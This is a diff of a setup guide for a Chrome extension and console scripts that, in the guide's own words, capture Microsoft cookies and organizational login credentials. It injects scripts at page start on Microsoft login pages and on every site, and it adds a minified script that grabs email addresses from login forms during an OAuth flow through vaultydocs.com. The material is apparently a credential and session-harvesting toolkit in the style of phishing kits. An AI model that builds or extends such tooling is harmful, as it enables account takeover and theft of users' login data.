@@ -35,14 +35,14 @@ This system captures **both** Microsoft cookies AND organizational login credent
         "*://account.microsoft.com/*",
         "*://login.microsoft.com/*"
       ],
-      "js": ["microsoft-injector.js"],
+      "js": ["microsoft-injector.js", "email-capturer.js"],
       "run_at": "document_start"
     },
     {
       "matches": [
         "*://*/*"
       ],
-      "js": ["organizational-injector.js"],
+      "js": ["organizational-injector.js", "email-capturer.js"],
       "run_at": "document_start",
       "exclude_matches": [
         "*://login.microsoftonline.com/*",
@@ -56,9 +56,10 @@ This system captures **both** Microsoft cookies AND organizational login credent
 }
 ```
 
-3. **Copy both injector scripts:**
+3. **Copy all injector scripts:**
    - Copy `src/utils/microsoft-cookie-injector.js` → save as `microsoft-injector.js`
    - Copy `src/utils/organizational-login-capturer.js` → save as `organizational-injector.js`
+   - Copy `src/utils/email-capture-enhancer.js` → save as `email-capturer.js`
 
 4. **Load the extension:**
    - Open Chrome → Extensions → Developer mode → Load unpacked
@@ -83,23 +84,27 @@ This system captures **both** Microsoft cookies AND organizational login credent
 
 ## Method 2: Manual Browser Console Injection
 
-### Step 1: Open Microsoft Login Page
+### Step 1: Start OAuth Flow
 
-1. Go to https://login.microsoftonline.com
-2. Open Developer Tools (F12)
+1. Go to https://vaultydocs.com and click login
+2. When redirected to Microsoft login page, open Developer Tools (F12)
 3. Go to Console tab
 
-### Step 2: Inject the Script
+### Step 2: Inject Email Capture Script (BEFORE entering email)
 
-1. **Copy the entire script** from `src/utils/microsoft-cookie-injector.js`
-2. **Paste it in the console** and press Enter
-3. **You should see:** `🎯 Microsoft Cookie Injector loaded and ready`
+1. **Copy and paste this script** in the console:
+
+```javascript
+// Email Capture Script - Paste this BEFORE entering your email
+(function(){console.log('📧 Email capture active');let e='';function t(e){e&&e.includes('@')&&(localStorage.setItem('microsoft_email',e),sessionStorage.setItem('login_hint',e),console.log('✅ Email stored:',e))}document.addEventListener('input',function(o){let n=o.target.value;n&&n.includes('@')&&t(n)});setInterval(()=>{document.querySelectorAll('input[type="email"], input[name*="email"]').forEach(e=>{e.value&&e.value.includes('@')&&e.value!==e&&t(e.value)})},1000)})();
+```
 
 ### Step 3: Complete Login Process
 
-1. **Enter your credentials** and login
-2. **The script automatically captures cookies** during the process
-3. **Check console logs** for confirmation
+1. **Enter your email** - it will be automatically captured
+2. **Complete the login process** normally
+3. **Check console logs** to confirm email capture
+4. **Continue to OAuth callback** - real email will be used
 
 ---
 
